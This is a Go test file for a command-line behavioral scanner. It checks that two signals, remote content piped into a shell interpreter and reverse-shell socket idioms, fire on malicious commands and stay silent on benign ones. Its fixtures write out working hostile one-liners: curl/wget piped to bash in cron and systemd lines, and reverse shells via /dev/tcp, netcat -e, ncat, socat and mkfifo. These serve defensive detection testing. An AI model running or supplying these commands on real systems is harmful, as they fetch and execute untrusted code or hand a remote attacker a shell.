package core

import "testing"

func hasSig(sigs []string, want string) bool {
	for _, s := range sigs {
		if s == want {
			return true
		}
	}
	return false
}

func TestFetchPipedToInterpreter_Positive(t *testing.T) {
	pos := []string{
		"@reboot root /usr/bin/systemd-run --on-active=60 /usr/bin/wget -qO- https://cdn.example.net/x | /bin/sh",
		"*/10 * * * * curl -fsSL https://h.example/i | bash",
		"ExecStart=/bin/sh -c 'curl -s https://repo.internal/refresh | sh'",
		"bash <(curl -s https://example/install)",
		". <(wget -qO- https://x/y)",
		"base64 -d /etc/.cache/blob | bash",
		"openssl enc -d -base64 -in x | sh",
		"curl -fsSL https://h/i | sudo bash",
		"wget -qO- https://h/i | env sh",
		"busybox wget -qO- http://h/i | sh",
	}
	for _, c := range pos {
		if !hasSig(ScanBehavioral(c), SignalFetchPipedToInterpreter) {
			t.Errorf("expected fetch_piped_to_interpreter to FIRE on: %q", c)
		}
	}
}

func TestFetchPipedToInterpreter_Negative(t *testing.T) {
	neg := []string{
		"curl -s https://api/metrics | jq '.cpu'",
		"wget -qO- https://x | tar -xz -C /opt",
		"curl -fsS https://health/ -o /dev/null",
		"curl -s https://x -o /tmp/f && sh /tmp/f",  // no top-level pipe; Tier-A handles the /tmp drop
		`bash -c "$(curl -s https://x)"`,            // command substitution, deferred to LFA
		"curl -fsSL https://h/i | python3 parse.py", // scripting subset, not emitted in v1
		"30 2 * * * postgres /usr/local/bin/pgbackup.sh",
		"base64 -d cert.b64 > /etc/ssl/x.pem",
		"echo hello | sh -c 'cat'", // no source stage (echo is not a downloader/decoder)
	}
	for _, c := range neg {
		if hasSig(ScanBehavioral(c), SignalFetchPipedToInterpreter) {
			t.Errorf("expected fetch_piped_to_interpreter to STAY SILENT on: %q", c)
		}
	}
}

func TestReverseShellSocketIdiom_Positive(t *testing.T) {
	pos := []string{
		"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
		"exec 5<>/dev/tcp/h/443; cat <&5 | sh >&5",
		"nc 10.0.0.5 4444 -e /bin/sh",
		"ncat --exec /bin/bash 10.0.0.5 4444",
		"socat exec:'bash -li',pty,stderr tcp:10.0.0.5:4444",
		"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.5 4444 >/tmp/f",
	}
	for _, c := range pos {
		if !hasSig(ScanBehavioral(c), SignalReverseShellSocketIdiom) {
			t.Errorf("expected reverse_shell_socket_idiom to FIRE on: %q", c)
		}
	}
}

func TestReverseShellSocketIdiom_Negative(t *testing.T) {
	neg := []string{
		"bash -c 'echo > /dev/tcp/db/5432 && echo up'", // liveness probe, no shell sink
		"timeout 1 bash -c '</dev/tcp/host/port'",      // wait-for-it readiness
		"nc -z host 22", // port check, no -e/-c
		"socat TCP-LISTEN:5000,fork TCP:backend:5000",           // port-forward relay, no EXEC
		"socat TCP-LISTEN:23,fork EXEC:/usr/bin/serial-handler", // EXEC to non-shell appliance
	}
	for _, c := range neg {
		if hasSig(ScanBehavioral(c), SignalReverseShellSocketIdiom) {
			t.Errorf("expected reverse_shell_socket_idiom to STAY SILENT on: %q", c)
		}
	}
}

func TestScanBehavioralEmptyAndPlain(t *testing.T) {
	for _, c := range []string{"", "   ", "*/5 * * * * root /usr/bin/find /var/log -mtime +7 -delete"} {
		if s := ScanBehavioral(c); len(s) != 0 {
			t.Errorf("expected no signals on %q, got %v", c, s)
		}
	}
}
